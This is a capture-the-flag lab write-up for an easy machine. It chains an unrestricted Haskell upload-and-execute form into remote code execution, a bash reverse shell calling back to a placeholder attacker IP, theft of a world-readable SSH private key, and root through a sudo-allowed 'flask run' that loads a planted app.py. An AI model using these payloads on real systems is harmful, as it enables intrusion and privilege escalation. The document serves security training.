---

### Challenge propertie(s) :
- ##### Difficulty : easy
- ##### Techniques : scan, service fingerprinting, arbitrary code execution via file upload, reverse shell, insecure file permissions (private key), sudoers misconfiguration, application auto-discovery abuse.
- ##### tools : nmap, curl, netcat (nc), ssh, VSCode.

### Challenge steps :

#### Part 1 : user.txt

1. I start with a basic nmap scan on the target IP.
	-> `nmap 10.10.0.27`

![[images_injection/fwf4.png]]
	
`commplex-link` is just the generic name nmap defaults to for this port when it doesn't recognize the service, it doesn't mean anything specific.

2. A version scan (`-sV -sC`) doesn't help much more on port 5001, but at least confirms the SSH version (OpenSSH 10.0p2 Debian) and shows the port answers HTTP requests.
	-> `nmap -sV -sC -p22,5001 10.10.0.27`

3. So I test it directly with curl, and it turns out to be a Flask (Werkzeug) app.
	-> `curl -i 10.10.0.27:5001`

![[images_injection/fwf3.png]]

4. Going to `/homework`, I find a form to upload `.hs` (Haskell) files. The page says the file is sent to an "autocorrect tool"; in reality it's just compiled and executed server-side with GHC.

	-> `curl -i 10.10.0.27:5001/homework`

![[images_injection/fwf2.png]]

5. I prepare a first payload in VSCode, `test.hs`, just to check the upload and compilation work:

	```haskell
	main :: IO ()
	main = putStrLn "I love Haskell"
	```

	I upload it with curl:
	-> `curl -i -X POST -F "file=@test.hs;type=text/x-haskell" http://10.10.0.27:5001/homework`
	-> `curl -i http://10.10.0.27:5001/uploads/test.hs`
	Output :
	-> `I love Haskell`

	It compiles and runs fine. One gotcha along the way: `curl -F` sends `Content-Type: application/octet-stream` by default, and on this server that could make the compilation fail completely randomly, even with perfectly valid Haskell code. Forcing `;type=text/x-haskell` explicitly makes it compile reliably every time.

6. The compiled program runs server-side with no restrictions. So I prepare a second payload, `id.hs`, using the `System.Process` module (`callCommand`) to run a system command directly from the "corrector":

	```haskell
	import System.Process

	main :: IO ()
	main = do
	  putStrLn "I love Haskell"
	  callCommand "id"
	```

	-> `curl -i -X POST -F "file=@id.hs;type=text/x-haskell" http://10.10.0.27:5001/homework`
	-> `curl -i http://10.10.0.27:5001/uploads/id.hs`
	Output :
	-> `uid=33(www-data) gid=33(www-data) groups=33(www-data)`

	RCE confirmed.

7. I prepare a third payload, `shell.hs`, to turn this into an interactive reverse shell: `callCommand` now spawns a `bash -i` connected back to a listener on my side.

	```haskell
	import System.Process

	main :: IO ()
	main = do
	  putStrLn "I love Haskell"
	  callCommand "bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'"
	```

	On the attacker side, I open the listener before sending the payload:
	-> `nc -lvnp 4444`
	-> `curl -i -X POST -F "file=@shell.hs;type=text/x-haskell" http://10.10.0.27:5001/homework`
	Output :
	-> I get a connection as `www-data@lambda`

8. Once inside, I look for the first flag.
	-> `find / -iname "user.txt" 2>/dev/null`

![[images_injection/fwf1.png]]

	-> `cat /home/prof/user.txt`
	Output :
	-> `EPI{h4sK377_C4n_83_r3vsh3ll_4s_W3lL}`

9. Looking at prof's `.ssh` folder, I notice his private key `id_rsa` is world-readable (`-rw-r--r--`). That's enough to log in over SSH directly, no password needed.
	-> `ls -la /home/prof/.ssh/`
	-> `cat /home/prof/.ssh/id_rsa`

10. I grab the key, save it locally, and use it to connect.
	-> `chmod 600 prof_id_rsa`
	-> `ssh -i prof_id_rsa prof@10.10.0.27`

#### Part 2 : root.txt

1. Usual reflex once connected: check what sudo lets me do.
	-> `sudo -l`
	Output :
	-> `(root) NOPASSWD: /usr/local/bin/flask run`

2. `prof` can run `flask run` as root, no password. I check the `flask` binary: it's just a small Python wrapper calling `flask.cli.main()`, so all the interesting logic lives inside the Flask package itself.
	-> `cat /usr/local/bin/flask`

3. Reading Flask's own docs, I find out that if `FLASK_APP` isn't set, `flask run` automatically looks for an `app.py` file in the directory the command is run from, and loads the Flask instance found inside. `sudo` doesn't change the working directory though, only the user: the command keeps whatever directory I was standing in when running `sudo`.

4. That means if I put myself in my own directory with my own `app.py`, and run `sudo flask run` from there, my file gets loaded, with root rights. And since Python runs any top-level code as soon as a file is imported, I can slip in a malicious command that runs immediately, before the server even starts.

	I prepare this file in VSCode, `app.py`, inside a folder called `inj`:

	```python
	import os
	os.system('cp /root/root.txt /home/prof/root.txt 2>/dev/null; chmod 644 /home/prof/root.txt 2>/dev/null')

	from flask import Flask
	app = Flask(__name__)

	@app.route('/')
	def home():
	    return "ok"
	```

	-> `mkdir -p /tmp/inj`
	-> `cd /tmp/inj`
	-> `nano app.py` (paste the content above, then save)
	-> `sudo /usr/local/bin/flask run &`

	The `os.system(...)` line copies the protected root flag to somewhere I can read. The rest of the file is just there so `flask run` doesn't crash right after; the actual exploit has already happened by that point.

5. I read the recovered flag.
	-> `cat /home/prof/root.txt`
	Output :
	-> `EPI{7VRns_0U7_p17H0N_1S_n0_83773r}`
